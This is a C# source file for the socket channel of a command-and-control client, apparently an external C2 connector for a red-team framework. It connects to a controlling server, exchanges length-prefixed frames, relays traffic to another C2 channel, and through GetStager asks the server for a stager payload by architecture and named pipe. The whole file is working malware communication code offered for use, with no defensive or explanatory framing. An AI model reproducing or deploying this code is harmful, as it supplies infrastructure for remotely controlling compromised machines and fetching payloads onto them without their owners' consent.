using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using ClientC2.interfaces;

namespace ClientC2.channels
{

    public class SocketChannel : IC2Channel
    {
        private const int MaxBufferSize = 1024 * 1024;
        private readonly IPEndPoint _endpoint;

        public SocketChannel(string ipAddr, string port)
        {
            var server = BitConverter.ToUInt32(
                IPAddress.Parse(ipAddr).GetAddressBytes(), 0);
            _endpoint = new IPEndPoint(server, Convert.ToInt32(port));
        }

        public Socket Socket { get; private set; }

    
        public bool Connected => Socket?.Connected ?? false;

        public bool Connect()
        {
            Socket = new Socket(_endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            Socket.Connect(_endpoint);

            if (!Socket.Connected) return false;

        
            Socket.ReceiveTimeout = 10000;

            return Socket.Connected;
        }

        public void Close()
        {
            Socket.Close();
        }

        public void Dispose()
        {
            Socket.Close();
        }

        public byte[] ReadFrame()
        {
            try
            {
                var sizeBytes = new byte[4];
                Socket.Receive(sizeBytes);
                var size = BitConverter.ToInt32(sizeBytes, 0) > MaxBufferSize
                    ? MaxBufferSize
                    : BitConverter.ToInt32(sizeBytes, 0);

                var total = 0;
                var bytesReceived = new byte[size];
                while (total < size)
                {
                    var bytes = Socket.Receive(bytesReceived, total, size - total, SocketFlags.None);
                    total += bytes;
                }
                if (size > 1 && size < 1024)
                    Console.WriteLine($"[+] Read frame: {Convert.ToBase64String(bytesReceived)}");

                return bytesReceived;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception while reading socket: {ex.Message}");
                return new byte[] { 0x00 };
            }
        }
        public void SendFrame(byte[] buffer)
        {
            if (buffer.Length > 2 && buffer.Length < 1024)
                Console.WriteLine($"[+] Sending frame: {Convert.ToBase64String(buffer)}");

            var lenBytes = BitConverter.GetBytes(buffer.Length);
            Socket.Send(lenBytes, 4, 0);
            Socket.Send(buffer);
        }

        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            if (buffer.Length <= 0) return false;
            c2.SendFrame(buffer);

            return true;
        }

        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            SendFrame(Encoding.ASCII.GetBytes(is64Bit ? "arch=x64" : "arch=x86"));
            SendFrame(Encoding.ASCII.GetBytes("pipename=" + pipeName));
            SendFrame(Encoding.ASCII.GetBytes("block=" + taskWaitTime));
            SendFrame(Encoding.ASCII.GetBytes("go"));

            return ReadFrame();
        }
    }
}
